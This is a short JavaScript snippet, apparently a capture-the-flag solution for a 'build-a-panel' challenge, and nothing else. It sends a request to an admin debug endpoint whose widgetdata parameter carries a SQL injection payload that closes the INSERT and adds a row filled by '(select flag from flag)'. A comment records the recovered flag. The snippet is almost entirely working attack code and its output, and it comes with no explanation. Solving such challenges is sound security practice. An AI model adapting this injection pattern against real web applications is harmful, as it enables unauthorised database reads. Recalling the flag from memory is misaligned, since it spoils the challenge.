const url = "https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=pocas&widgetname=adfdaf&widgetdata=a'), ('pocas', (select flag from flag), '{\"type\":\"pocas\"}')--"
fetch(url).then((x) => x.text()).then((x) => console.log(x));

// Output : dice{ch41n_ChAIn_aNd_m0Re_cHaIn}
